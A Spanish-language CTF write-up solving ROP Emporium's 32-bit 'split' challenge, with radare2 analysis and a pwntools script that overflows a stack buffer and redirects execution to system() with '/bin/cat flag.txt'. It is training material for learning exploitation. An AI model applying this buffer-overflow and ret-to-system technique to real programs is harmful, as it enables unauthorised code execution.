---
layout: post
title: Split32 - RopEmporium
tags: [ctf, ropemporium]
---

**Autor**: RopEmporium \\
**Challenge**: 2

![img](/imgs/write-ups/ropemporium/split32/split32.png#center)

## Introducción

Al igual que en el desafío anterior, las herramientas que voy a usar son **Radare2** y **PwnTools**.

Desde el siguiente enlace de me descargo un zip con el binario y la bandera, **[Split](https://ropemporium.com/challenge/split.html)**. En este writeup resuelvo la version **x86**.

## Información del binario

```
kali@kali:~/Desktop/ropemporium$ rabin2 -I split32 
arch     x86
baddr    0x8048000
binsz    6256
bintype  elf
bits     32
canary   false
class    ELF32
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  Intel 80386
nx       true
os       linux
pic      false
relocs   true
relro    partial
rpath    NONE
sanitize false
static   false
stripped false
subsys   linux
va       true
```

Volvemos a ver que **nx** está activado, por lo que el stack no es ejecutable. También compruebo que efectivamente su arquitectura es **x86**.

## Ejecución

Al ejecutar el binario me muestra un texto y luego me pide una entrada.

```
kali@kali:~/Desktop/ropemporium$ ./split32                                                   
split by ROP Emporium
x86

Contriving a reason to ask user for data...
> LordP4
Thank you!

Exiting
```

La ejecución no es muy diferente al caso anterior.

## Funciones

Listo las funciones dentro de radare2.

```
[0xf7f1b450]> afl
[...]
0x080485ad    1 95           sym.pwnme
[...]
0x0804860c    1 25           sym.usefulFunction
[...]
0x08048546    1 103          main
[...]
```

Otra vez, tenemos 2 funciones interesantes a parte del main.

### Main

![img](/imgs/write-ups/ropemporium/split32/main.png#center)

**1)** Anoto esta dirección que será la que tenga que sobreescribir en el stack.

### Pwnme

![img](/imgs/write-ups/ropemporium/split32/pwnme.png#center)

En las marcas **1** y **2** vemos el tamaño reservado para la variable (0x20) y el tamaño de la entrada del usuario(0x60).

### UsefulFunction

![img](/imgs/write-ups/ropemporium/split32/useful.png#center)

En esta función ya comienza lo divertido. Vemos que otra vez carga una cadena con un comando a ejecutar, pero esta vez es **/bin/ls**. Pero este comando no nos sirve para leer el archivo "flag.txt" por lo que hay que utilizar otra cadena que por conveniencia ya se encuentra en el binario.

![img](/imgs/write-ups/ropemporium/split32/flag.png#center)

Tendremos que pasar la cadena "/bin/cat flag.txt" a la llamada a **system()**.

## Explotación

Para realizar la explotación, creo un script en python en el que utilizaré **pwntools**.

En este desafío no utilizo la dirección del comienzo de la funcion **sym.usefulFunction** dado que se cargaría el comando **/bin/ls**. En este caso hay que cargar la dirección de **sym.imp.system** directamente, pero antes de eso, en el stack debería estar la dirección en la que se encuentra el comando que quiero ejecutar ("/bin/cat flag.txt"). Para conseguir esto, añado la dirección del comando después de sobreescribir la dirección de retorno.

exploit.py

```python
#!/bin/python3

from pwn import *

p = process("./split32")
p.recvuntil(">")

payload = b""
payload += b"A" * 44       # Padding
payload += p32(0x0804861a) # 0x0804861a call sym.imp.system
payload += p32(0x0804a030) # 0x0804a030 .data  ascii "/bin/cat flag.txt"

p.sendline(payload)

print(p.recvall())
```

## Solución

Al ejecutarlo, obtenemos la bandera.

```
kali@kali:~/Desktop/ropemporium$ python3 exploit.py
[+] Starting local process './split32': pid 55324
/home/kali/Desktop/ropemporium/exploit.py:4: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil(">")
[+] Receiving all data: Done (45B)
[*] Stopped process './split32' (pid 55324)
b' Thank you!\nROPE{a_placeholder_32byte_flag!}\n'
```

Y con esto termina mi solución. :)
